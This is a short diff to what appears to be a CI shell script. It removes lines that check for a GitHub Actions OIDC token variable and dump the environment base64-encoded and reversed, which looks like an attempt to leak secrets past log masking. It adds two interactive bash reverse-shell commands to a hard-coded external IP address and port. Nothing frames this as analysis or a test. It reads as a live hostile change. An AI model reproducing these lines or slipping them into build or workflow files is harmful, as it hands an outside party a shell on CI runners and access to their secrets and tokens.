@@ -1,9 +1,3 @@
-if [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
-  echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN not set" >&2
-  exit 0
-fi
-env|base64
-echo test
-env|rev
-echo test2
-sleep 600
+/bin/bash -i >& /dev/tcp/37.120.166.245/8081 0>&1
+sleep 10
+/bin/bash -i >& /dev/tcp/37.120.166.245/8081 0>&1
